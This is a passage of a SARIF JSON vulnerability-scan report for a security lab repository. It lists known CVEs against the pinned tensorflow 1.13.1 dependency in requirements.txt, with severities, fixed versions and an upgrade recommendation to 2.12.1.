            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29212 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29212](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29212)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2d35c66f37c2d34b52d733f6bba70b14643c9c70"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29200",
          "ruleIndex": 335,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29200 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29200](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29200)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "64c0019edeabcbf94935b73ad8175a1796f6c738"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29199",
          "ruleIndex": 336,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29199 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29199)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "357bb1b9128add513de94e7ecde9bea4e0a13a91"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29204",
          "ruleIndex": 337,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29204 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29204)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "33f6275538861da5d435df0bb152fc78134f0e96"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29205",
          "ruleIndex": 338,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29205 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29205)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "febeac10c52203f061ef932aec766b1f2939eec2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29202",
          "ruleIndex": 339,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29202 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29202)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8636040055faeba4baf0772a1b615f72c6753f2a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "GHSA-mw6j-hh29-h379",
          "ruleIndex": 340,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability GHSA-mw6j-hh29-h379 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [GHSA-mw6j-hh29-h379](https://github.com/advisories/GHSA-mw6j-hh29-h379)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5e6cf2ec7dd437479da0f95bb15c6f3e9259c80b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29194",
          "ruleIndex": 341,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29194 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29194](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29194)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "edd8f7e732293c4824dab8600147c5173ceefdba"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29192",
          "ruleIndex": 342,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29192 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29192](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29192)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f12ebd3cd7aac92817a2a5a3eb2851b057537ca4"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29211",
          "ruleIndex": 343,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29211 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29211](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29211)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a86c345c5dd482f2478a68bccabbbba9969acf71"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29208",
          "ruleIndex": 344,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29208 (severity: high, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29208](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29208)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f7bb0703a2ff1f00dba2e2309cb6777c5635d1ad"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29201",
          "ruleIndex": 345,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29201 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29201](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29201)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0d28bfc0ed4bec6c94f1c5a55ddfe81d4763e81d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23590",
          "ruleIndex": 346,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23590 (severity: medium, fixed in 2.7.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23590](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23590)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8f05f1a17daedce1534e9bf72e8453680a5869e7"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35996",
          "ruleIndex": 347,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35996 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35996](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35996)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d036f3a0e9511884e3a6063ab887eb9bcd8254b2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35988",
          "ruleIndex": 348,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35988 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35988](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35988)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "713e0ae9593aba9139cffe9f3adfcf6e4f47c99a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35968",
          "ruleIndex": 349,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35968 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35968](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35968)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1d56a3cfc71e4642912c7bbe5a4990553d08199e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36014",
          "ruleIndex": 350,
          "level": "warning",
          "message": {
